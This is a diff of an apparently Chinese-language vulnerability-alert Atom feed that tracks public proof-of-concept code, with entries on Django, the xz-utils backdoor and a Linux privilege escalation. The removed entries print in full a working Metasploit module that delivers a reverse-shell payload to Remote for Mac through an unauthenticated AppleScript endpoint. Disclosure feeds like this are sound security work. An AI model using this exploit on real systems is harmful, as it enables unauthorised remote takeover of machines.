@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-03T09:29:37.253Z</updated>
+  <updated>2025-06-03T09:45:32.377Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,70 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Django strip_tags() Security Issue</title>
+    <link href="http://example.com/2025/06/03/github_545553022/"/>
+    <id>http://example.com/2025/06/03/github_545553022/</id>
+    <published>2025-06-03T09:45:32.380Z</published>
+    <updated>2025-06-03T09:45:32.377Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Django strip_tags() Security Issue</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025-32873</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞描述：</strong> Django框架中的strip_tags()函数存在安全漏洞（CVE-2025-32873），可能被利用进行攻击。</p><p><strong>产品厂商：</strong> Django</p><p><strong>产品名称：</strong> Django</p><p><strong>影响版本：</strong> 5.2</p><p><strong>来源：</strong> <a href="https://github.com/Apollo-R3bot/django-vulnerability-CVE-2025-32873">https://github.com/Apollo-R3bot/django-vulnerability-CVE-2025-32873</a></p><p><strong>类型：</strong> CVE-2025:github search</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs ldif"><br><span class="hljs-comment"># Django Security Issue on strip_tags()</span><br><br><span class="hljs-comment">#requirements</span><br><span class="hljs-literal">-</span> Django 5.2<br><span class="hljs-literal">-</span> Django Rate Limit (pip install django-ratelimit)<br><br><br></code></pre></td></tr></table></figure><pre><code class="hljs">- README.md```</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Django strip_tags() Security Issue&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2025-32873</summary>
+      
+    
+    
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="CVE-2025-32873" scheme="http://example.com/tags/CVE-2025-32873/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>xz-utils (liblzma) 后门漏洞</title>
+    <link href="http://example.com/2025/06/03/github_1433739717/"/>
+    <id>http://example.com/2025/06/03/github_1433739717/</id>
+    <published>2025-06-03T09:45:18.023Z</published>
+    <updated>2025-06-03T09:45:18.021Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> xz-utils (liblzma) 后门漏洞</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-3094</li></ul><p><strong>漏洞类型：</strong> 其他</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> 该项目分析了在xz-utils (liblzma)中发现的高调后门，影响了版本5.6.0和5.6.1。恶意代码被引入上游构建系统，通过修改sshd与LZMA压缩库在运行时的交互方式，针对SSH认证。此项目仅用于教育和防御研究目的。</p><p><strong>产品名称：</strong> xz-utils (liblzma)</p><p><strong>影响版本：</strong> 5.6.0 &lt;&#x3D; version &lt;&#x3D; 5.6.1</p><p><strong>来源：</strong> <a href="https://github.com/valeriot30/cve-2024-3094">https://github.com/valeriot30/cve-2024-3094</a></p><p><strong>类型：</strong> CVE-2024:github search</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><br><span class="hljs-comment"># 🛡️ Cybersecurity Project: Analyzing the XZ Backdoor in liblzma</span><br><br><span class="hljs-comment">## 📄 Overview</span><br><br><span class="hljs-string">This</span> <span class="hljs-string">project</span> <span class="hljs-string">analyzes</span> <span class="hljs-string">the</span> <span class="hljs-string">high-profile</span> <span class="hljs-string">backdoor</span> <span class="hljs-string">discovered</span> <span class="hljs-string">in</span> <span class="hljs-string">**xz-utils</span> <span class="hljs-string">(liblzma)**,</span> <span class="hljs-string">affecting</span> <span class="hljs-string">versions</span> <span class="hljs-string">**5.6.0**</span> <span class="hljs-string">and</span> <span class="hljs-string">**5.6.1**.</span> <span class="hljs-string">The</span> <span class="hljs-string">malicious</span> <span class="hljs-string">code</span> <span class="hljs-string">introduced</span> <span class="hljs-string">into</span> <span class="hljs-string">the</span> <span class="hljs-string">upstream</span> <span class="hljs-string">build</span> <span class="hljs-string">system</span> <span class="hljs-string">targeted</span> <span class="hljs-string">SSH</span> <span class="hljs-string">authentication</span> <span class="hljs-string">by</span> <span class="hljs-string">modifying</span> <span class="hljs-string">how</span> <span class="hljs-string">\`sshd\`</span> <span class="hljs-string">interacts</span> <span class="hljs-string">with</span> <span class="hljs-string">the</span> <span class="hljs-string">LZMA</span> <span class="hljs-string">compression</span> <span class="hljs-string">library</span> <span class="hljs-string">at</span> <span class="hljs-string">runtime.</span><br><br><span class="hljs-string">&gt;</span> <span class="hljs-string">⚠️</span> <span class="hljs-string">This</span> <span class="hljs-string">project</span> <span class="hljs-string">is</span> <span class="hljs-string">for</span> <span class="hljs-string">**educational</span> <span class="hljs-string">and</span> <span class="hljs-string">defensive</span> <span class="hljs-string">research**</span> <span class="hljs-string">purposes</span> <span class="hljs-string">only.</span><br><br><span class="hljs-meta">---</span><br><span class="hljs-meta"></span><br><span class="hljs-meta"></span><br></code></pre></td></tr></table></figure><pre><code class="hljs">- README.md```</code></pre>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; xz-utils (liblzma) 后门漏洞&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-3094&lt;/li&gt;
+&lt;/ul&gt;
+</summary>
+      
+    
+    
+    
+    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
+    
+    
+    <category term="CVE-2024:github search" scheme="http://example.com/tags/CVE-2024-github-search/"/>
+    
+    <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+    <category term="CVE-2024-3094" scheme="http://example.com/tags/CVE-2024-3094/"/>
+    
+  </entry>
   
   <entry>
     <title>【AI高危漏洞预警】AstrBot路径遍历漏洞CVE-2025-48957</title>
@@ -199,9 +263,9 @@
     <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
     
     
-    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
-    
     <category term="其他" scheme="http://example.com/tags/%E5%85%B6%E4%BB%96/"/>
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
     
     <category term="CVE-2025-4123" scheme="http://example.com/tags/CVE-2025-4123/"/>
     
@@ -545,66 +609,6 @@
     <category term="CVE-2024-23113" scheme="http://example.com/tags/CVE-2024-23113/"/>
     
     <category term="格式字符串漏洞" scheme="http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Linux 权限提升漏洞 (CVE-2024-26809)</title>
-    <link href="http://example.com/2025/06/01/github_3933360352/"/>
-    <id>http://example.com/2025/06/01/github_3933360352/</id>
-    <published>2025-06-01T22:15:14.899Z</published>
-    <updated>2025-06-01T22:15:14.896Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Linux 权限提升漏洞 (CVE-2024-26809)</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2024-26809</li></ul><p><strong>漏洞类型：</strong> 权限提升</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> CVE-2024-26809是一个Linux权限提升漏洞，允许攻击者在受影响的系统上提升权限。此漏洞的利用代码已公开，且被描述为一个自包含、超便携的Linux exploit。</p><p><strong>产品名称：</strong> Linux</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/issues/19863">https://github.com/rapid7/metasploit-framework/issues/19863</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">&lt;!<span class="hljs-comment">--</span><br>  To make <span class="hljs-keyword">it</span> easier <span class="hljs-keyword">for</span> us <span class="hljs-built_in">to</span> help you, please <span class="hljs-built_in">include</span> <span class="hljs-keyword">as</span> much useful information <span class="hljs-keyword">as</span> possible.<br><br>  Useful Links:<br>  - Wiki: <span class="hljs-keyword">https</span>://docs.metasploit.com/<br><br>  Before opening <span class="hljs-keyword">a</span> <span class="hljs-built_in">new</span> issue, please search existing issues <span class="hljs-keyword">https</span>://github.com/rapid7/metasploit-framework/issues<br><span class="hljs-comment">--&gt;</span><br><br><span class="hljs-comment">## Summary</span><br><br>Offset-less Linux LPE (CVE<span class="hljs-number">-2024</span><span class="hljs-number">-26809</span>)<br><br><span class="hljs-comment">### Basic example</span><br><br>![Image](<span class="hljs-keyword">https</span>://github.com/user-attachments/assets/f77f9608-d343<span class="hljs-number">-4039</span><span class="hljs-number">-80</span>a8<span class="hljs-number">-51</span>fb1bd64716)<br><br>- <span class="hljs-keyword">https</span>://osec.io/blog/<span class="hljs-number">2024</span><span class="hljs-number">-11</span><span class="hljs-number">-25</span>-netfilter-universal-root<span class="hljs-number">-1</span>-day/<br>- <span class="hljs-keyword">https</span>://github.com/otter-<span class="hljs-built_in">sec</span>/OtterRoot/tree/master<br><br><span class="hljs-comment">### Motivation</span><br><br>Self-contained (<span class="hljs-keyword">a</span> single exploit.c <span class="hljs-built_in">file</span>) ultra-portable Linux exploit.<br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Linux 权限提升漏洞 (CVE-2024-26809)&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/strong&gt;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;&lt;strong&gt;CVE：&lt;/strong&gt; CVE-2024-26809&lt;/li&gt;</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="权限提升" scheme="http://example.com/tags/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/"/>
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="CVE-2024-26809" scheme="http://example.com/tags/CVE-2024-26809/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Remote for Mac 未授权远程代码执行漏洞</title>
-    <link href="http://example.com/2025/06/01/github_3791900306/"/>
-    <id>http://example.com/2025/06/01/github_3791900306/</id>
-    <published>2025-06-01T20:45:16.061Z</published>
-    <updated>2025-06-01T20:45:16.058Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>漏洞名称：</strong> Remote for Mac 未授权远程代码执行漏洞</p><p><strong>漏洞类型：</strong> 未授权访问</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> 该模块利用了Remote for Mac版本至2025.7（包括补丁版本）中的未授权远程代码执行漏洞，通过&#x2F;api&#x2F;executeScript端点。当目标系统上禁用认证时，攻击者可以执行任意AppleScript命令，包括通过<code>do shell script</code>执行的shell命令。</p><p><strong>产品名称：</strong> Remote for Mac</p><p><strong>影响版本：</strong> version &lt;&#x3D; 2025.7</p><p><strong>来源：</strong> <a href="https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb">https://github.com/rapid7/metasploit-framework/blob/a21fc34c4d7268d9e14610e8a8a4e429eecf74ed/modules%2Fexploits%2Fosx%2Fhttp%2Fremote_for_mac_rce.rb</a></p><p><strong>类型：</strong> rapid7&#x2F;metasploit-framework:github issues</p><pre><code class="hljs">require &#39;json&#39;class MetasploitModule &lt; Msf::Exploit::Remote  Rank = NormalRanking  include Msf::Exploit::Remote::HttpClient  prepend Msf::Exploit::Remote::AutoCheck  def initialize(info = &#123;&#125;)    super(      update_info(        info,        &#39;Name&#39; =&gt; &#39;Remote for Mac &lt;= 2025.7 - Unauthenticated RCE&#39;,        &#39;Description&#39; =&gt; %q&#123;          This module exploits an unauthenticated remote code execution vulnerability in          Remote for Mac versions up to and including 2025.7 via the /api/executeScript endpoint.          When authentication is disabled on the target system, it allows attackers to execute          arbitrary AppleScript commands, which can include shell commands via \`do shell script\`.          All versions up to 2025.7 (including patch versions) are vulnerable.        &#125;,        &#39;License&#39; =&gt; MSF_LICENSE,        &#39;Author&#39; =&gt; [&#39;Chokri Hammedi (@blue0x1)&#39;],        &#39;References&#39; =&gt; [          [&#39;PACKETSTORM&#39;, &#39;195347&#39;]        ],        &#39;DisclosureDate&#39; =&gt; &#39;2025-05-27&#39;,        &#39;Platform&#39; =&gt; [&#39;unix&#39;,&#39;osx&#39;],        &#39;Arch&#39; =&gt; ARCH_CMD,        &#39;Targets&#39; =&gt; [[&#39;Auto&#39;, &#123;&#125;]],        &#39;DefaultTarget&#39; =&gt; 0,        &#39;DefaultOptions&#39; =&gt; &#123;          &#39;RPORT&#39; =&gt; 49229,          &#39;SSL&#39; =&gt; true        &#125;,        &#39;Notes&#39; =&gt; &#123;          &#39;Stability&#39; =&gt; [&#39;CRASH_SAFE&#39;],          &#39;Reliability&#39; =&gt; [&#39;REPEATABLE_SESSION&#39;],          &#39;SideEffects&#39; =&gt; [&#39;ARTIFACTS_ON_DISK&#39;]        &#125;      )    )  end  def check    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;getVersion&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;    )    return CheckCode::Unknown(&#39;No response from target&#39;) unless res&amp;.code == 200    info = res.get_json_document    if info.empty?      return CheckCode::Unknown(&#39;Unable to parse JSON from /api/getVersion&#39;)    end    if info.dig(&#39;requires.auth&#39;) == true      return CheckCode::Safe(&#39;Target requires authentication on /api/executeScript&#39;)    end    version = info.dig(&#39;version&#39;).to_s    if version.empty?      return CheckCode::Unknown(&#39;Could not determine target version&#39;)    end    begin      target_version = Rex::Version.new(version)      vulnerable_version = Rex::Version.new(&#39;2025.7&#39;)            if target_version &lt;= vulnerable_version        return CheckCode::Appears      else        return CheckCode::Safe(&quot;Target version #&#123;version&#125; is not vulnerable&quot;)      end    rescue ArgumentError      return CheckCode::Unknown(&quot;Invalid version format: #&#123;version&#125;&quot;)    end  end  def exploit    print_status(&quot;Generating reverse shell payload for #&#123;datastore[&#39;LHOST&#39;]&#125;:#&#123;datastore[&#39;LPORT&#39;]&#125;&quot;)    cmd = payload.encoded    applescript = %(do shell script &quot;#&#123;cmd&#125;&quot;)    host_name = Rex::Text.rand_text_alpha(8)    host_model = &quot;#&#123;Rex::Text.rand_text_alpha(4)&#125;#&#123;rand(99)&#125;&quot;    script_name = Rex::Text.rand_text_alpha(8)    print_status(&quot;Sending exploit to #&#123;rhost&#125;:#&#123;rport&#125; via AppleScript&quot;)    res = send_request_cgi(      &#39;uri&#39; =&gt; normalize_uri(target_uri.path, &#39;api&#39;, &#39;executeScript&#39;),      &#39;method&#39; =&gt; &#39;GET&#39;,      &#39;headers&#39; =&gt; &#123;        &#39;X-ClientToken&#39; =&gt; Rex::Text.rand_text_numeric(4),        &#39;X-HostName&#39; =&gt; host_name,        &#39;X-HostFullModel&#39; =&gt; host_model,        &#39;X-Script&#39; =&gt; applescript,        &#39;X-ScriptName&#39; =&gt; script_name,        &#39;X-ScriptDelay&#39; =&gt; &#39;0&#39;      &#125;    )    if res&amp;.code == 200      print_good(&#39;Payload delivered successfully. Awaiting session...&#39;)    else      fail_with(Failure::UnexpectedReply, &quot;Unexpected HTTP response: #&#123;res&amp;.code || &#39;no response&#39;&#125;&quot;)    end  endend```</code></pre>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Remote for Mac 未授权远程代码执行漏洞&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞类型：&lt;/strong&gt; 未授权访问&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞等级：&lt;/strong&gt; 高危&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;漏洞描</summary>
-      
-    
-    
-    
-    <category term="Github Poc 监控" scheme="http://example.com/categories/Github-Poc-%E7%9B%91%E6%8E%A7/"/>
-    
-    
-    <category term="rapid7/metasploit-framework:github issues" scheme="http://example.com/tags/rapid7-metasploit-framework-github-issues/"/>
-    
-    <category term="未授权访问" scheme="http://example.com/tags/%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/"/>
     
   </entry>
   
